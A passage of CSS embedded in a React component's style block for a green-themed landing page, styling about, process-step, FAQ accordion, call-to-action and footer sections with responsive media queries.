          display: flex;
          align-items: center;
          gap: 10px;
        }

        .achievement-item span {
          font-size: 1rem;
        }

        .about-cta {
          margin-top: 24px;
          background: linear-gradient(180deg, #0d9b76 0%, #0a8d6a 100%);
          color: #fff;
          border-radius: 22px;
          padding: 18px 18px 20px;
          text-align: center;
          box-shadow: 0 18px 28px rgba(13, 155, 118, 0.18);
        }

        .about-cta h4 {
          margin: 0;
          font-size: 1.2rem;
          font-weight: 900;
        }

        .about-cta p {
          margin: 8px 0 0;
          font-size: 0.75rem;
          opacity: 0.9;
          line-height: 1.6;
        }

        .about-cta button {
          margin-top: 16px;
          background: #fff;
          color: var(--primary-dark);
          border: none;
          border-radius: 14px;
          padding: 12px 20px;
          font-weight: 800;
          cursor: pointer;
        }

        .process-shell {
          background: rgb(16 185 129 / 0.04);
          border-radius: 30px;
          margin: 56px 20px 0;
          padding-top: 24px;
          padding-bottom: 22px;
          border: 1px solid rgb(16 185 129 / 0.08);
        }

        .steps {
          margin-top: 20px;
          display: grid;
          gap: 14px;
        }

        .step {
          background: #fff;
          border: 1px solid #edf2f7;
          border-radius: 18px;
          padding: 16px;
          display: flex;
          align-items: flex-start;
          gap: 14px;
          box-shadow: 0 10px 18px rgba(15, 23, 42, 0.02);
        }

        .step-number {
          width: 38px;
          height: 38px;
          border-radius: 50%;
          background: linear-gradient(180deg, #0d9b76, #0a8d6a);
          color: #fff;
          display: grid;
          place-items: center;
          font-size: 0.8rem;
          font-weight: 800;
          flex-shrink: 0;
        }

        .step-title {
          font-size: 0.97rem;
          font-weight: 800;
          color: var(--text);
          margin-bottom: 6px;
        }

        .step-copy {
          color: var(--muted);
          font-size: 0.74rem;
          line-height: 1.7;
        }

        .tech-panel {
          margin-top: 24px;
          padding-top: 8px;
        }

        .tech-pills {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
          margin-top: 18px;
        }

        .tech-pill {
          padding: 9px 12px;
          border-radius: 999px;
          background: #0d9b76;
          color: #fff;
          font-weight: 700;
          font-size: 0.68rem;
          border: 1px solid rgba(13, 155, 118, 0.18);
        }

        .tech-pill.alt {
          background: #fff;
          color: var(--primary-dark);
        }

        .faq-shell {
          padding-bottom: 14px;
        }

        .faq-meta {
          margin-top: 18px;
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 10px;
        }

        .faq-meta-item {
          background: #fff;
          border: 1px solid #edf2f7;
          border-radius: 16px;
          padding: 14px 8px;
          text-align: center;
          box-shadow: 0 8px 18px rgba(15, 23, 42, 0.02);
        }

        .faq-meta-item strong {
          display: block;
          font-size: 1rem;
          font-weight: 900;
          color: var(--text);
          letter-spacing: -0.04em;
        }

        .faq-meta-item span {
          display: block;
          margin-top: 4px;
          font-size: 0.62rem;
          color: var(--muted);
          font-weight: 700;
        }

        .faq-items {
          margin-top: 18px;
          display: grid;
          gap: 12px;
        }

        .faq-item {
          background: #fff;
          border: 1px solid #e2e8f0;
          border-radius: 18px;
          overflow: hidden;
          box-shadow: 0 10px 18px rgba(15, 23, 42, 0.02);
        }

        .faq-q {
          width: 100%;
          background: transparent;
          border: none;
          text-align: left;
          padding: 16px 18px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          gap: 12px;
          cursor: pointer;
          font-weight: 800;
          font-size: 0.78rem;
          color: var(--text);
        }

        .faq-plus {
          width: 22px;
          height: 22px;
          border-radius: 50%;
          background: rgba(13, 155, 118, 0.12);
          color: var(--primary-dark);
          display: grid;
          place-items: center;
          font-size: 1.1rem;
          line-height: 1;
          font-weight: 800;
          transition: transform 0.18s ease;
        }

        .faq-item.open .faq-plus {
          transform: rotate(45deg);
        }

        .faq-a {
          max-height: 0;
          opacity: 0;
          overflow: hidden;
          padding: 0 18px;
          transition: max-height 0.24s ease, opacity 0.22s ease, padding 0.22s ease;
          color: var(--muted);
          font-size: 0.74rem;
          line-height: 1.7;
        }

        .faq-item.open .faq-a {
          max-height: 220px;
          opacity: 1;
          padding: 0 18px 16px;
        }

        .still-q {
          margin-top: 24px;
          border-radius: 20px;
          background: linear-gradient(180deg, #0d9b76 0%, #0a8d6a 100%);
          color: #fff;
          text-align: center;
          padding: 22px 18px;
        }

        .still-q h4 {
          margin: 0;
          font-size: 1.2rem;
          font-weight: 900;
        }

        .still-q p {
          margin: 10px auto 0;
          max-width: 380px;
          font-size: 0.74rem;
          opacity: 0.9;
          line-height: 1.6;
        }

        .still-q button {
          margin-top: 18px;
          background: #fff;
          color: var(--primary-dark);
          border: none;
          border-radius: 14px;
          padding: 12px 20px;
          font-weight: 800;
          cursor: pointer;
        }

        .site-footer {
          background: #062e22;
          color: #e7fff7;
          margin-top: 58px;
          padding: 28px 20px 30px;
          border-radius: 26px 26px 0 0;
        }

        .footer-top {
          display: flex;
          flex-direction: column;
          gap: 12px;
        }

        .f-logo-v {
          font-size: 1.2rem;
          font-weight: 900;
          letter-spacing: -0.06em;
        }

        .f-logo-v span {
          color: rgba(255, 255, 255, 0.72);
        }

        .f-desc {
          color: rgba(230, 255, 244, 0.8);
          font-size: 0.72rem;
          line-height: 1.7;
          max-width: 580px;
        }

        .f-cols {
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 26px;
          margin-top: 22px;
        }

        .fc-h {
          font-size: 0.7rem;
          letter-spacing: 0.12em;
          text-transform: uppercase;
          color: rgba(255, 255, 255, 0.82);
          font-weight: 800;
          margin-bottom: 10px;
        }

        .fc-links {
          display: grid;
          gap: 8px;
        }

        .fc-links a {
          color: rgba(231, 255, 247, 0.7);
          font-size: 0.72rem;
          line-height: 1.6;
        }

        .f-status {
          margin-top: 22px;
          display: flex;
          flex-wrap: wrap;
          gap: 8px;
        }

        .f-badge {
          background: rgba(13, 155, 118, 0.14);
          border: 1px solid rgba(110, 231, 183, 0.25);
          border-radius: 999px;
          color: #d1fae5;
          font-weight: 700;
          font-size: 0.68rem;
          padding: 8px 12px;
        }

        .f-bottom {
          margin-top: 22px;
          padding-top: 16px;
          border-top: 1px solid rgba(110, 231, 183, 0.18);
          display: flex;
          flex-direction: column;
          gap: 8px;
          color: rgba(209, 250, 229, 0.75);
          font-size: 0.68rem;
        }

        @media (min-width: 720px) {
          .nav-right {
            margin-left: auto;
          }

          .nav-links {
            display: flex;
            align-items: center;
            gap: 28px;
            position: absolute;
            left: 50%;
            transform: translateX(-50%);
          }

          .nav-links a {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.86rem;
            font-weight: 600;
          }

          .hero-inner {
            width: min(100%, 620px);
          }

          .process-shell,
          .about-shell,
          .faq-shell {
            padding-left: 28px;
            padding-right: 28px;
          }

          .site-footer {
            padding-left: 30px;
            padding-right: 30px;
          }
        }

        @media (max-width: 640px) {
          .topbar {
            gap: 10px;
            padding-top: 4px;
          }

          .nav-brand-name {
            font-size: 1.02rem;
          }

          .nav-brand-sub {
            font-size: 0.62rem;
          }

          .nav-left {
            gap: 10px;
            min-width: 0;
          }

          .nav-right {
            gap: 8px;
          }

          .nav-theme,
          .nav-ham {
            width: 38px;
            height: 38px;
          }

          .hero-shell {
            padding-left: 14px;
            padding-right: 14px;
          }

          .hero-inner {
            width: min(100%, 440px);
          }

          .trust-pill {
            max-width: 100%;
            padding: 7px 12px;
            font-size: 0.68rem;
          }

          .hero-h1 {
            font-size: clamp(2rem, 9vw, 3rem);
          }

          .hero-desc {
            font-size: 0.82rem;
          }

          .checklist {
            width: 100%;
          }

          .cli {
            font-size: 0.88rem;
          }

          .check-now-btn {
            width: min(100%, 330px);
            min-height: 52px;
          }

          .bstrip {
            grid-template-columns: 1fr;
            width: min(100%, 280px);
            gap: 14px;
          }

          .stats-grid,
          .about-metrics,
          .faq-meta {
            grid-template-columns: repeat(2, minmax(0, 1fr));
          }

          .value-grid,
          .feature-grid,
          .standard-grid {
            grid-template-columns: 1fr;
          }

          .faq-q {
            align-items: flex-start;
            padding: 14px 14px;
          }

          .faq-plus {
            flex-shrink: 0;
            margin-top: 2px;
          }

          .f-status {
            display: grid;
            grid-template-columns: 1fr;
          }
        }

        @media (max-width: 420px) {
          .topbar {
            padding-top: 6px;
          }

          .nav-brand-name {
            font-size: 0.94rem;
          }

          .nav-left {
            gap: 8px;
          }

          .nav-logo-circle {
            width: 42px;
            height: 42px;
          }

          .hero-shell {
            padding-left: 12px;
            padding-right: 12px;
          }

          .stats-grid,
          .about-metrics,
          .faq-meta,
          .value-grid,
          .feature-grid,
          .standard-grid,
          .f-cols {
            grid-template-columns: 1fr;
          }

          .section-title {
            font-size: clamp(1.55rem, 8vw, 2.15rem);
          }

          .check-now-btn {
            width: 100%;
          }

          .still-q h4 {
            font-size: 1.05rem;
          }
        }
      `}</style>
    </>
  );
}
